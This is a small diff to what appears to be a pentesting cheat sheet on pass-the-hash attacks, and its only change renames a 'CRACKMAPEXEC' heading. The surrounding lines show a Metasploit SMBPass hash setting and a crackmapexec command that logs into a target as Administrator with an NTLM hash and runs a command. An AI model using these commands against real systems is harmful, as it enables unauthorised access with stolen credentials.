@@ -62,7 +62,7 @@ set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
 exploit
 ```
 
-### CRACKMAPEXEC
+### Crack Map Exec
 ```bash
 crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
 ```
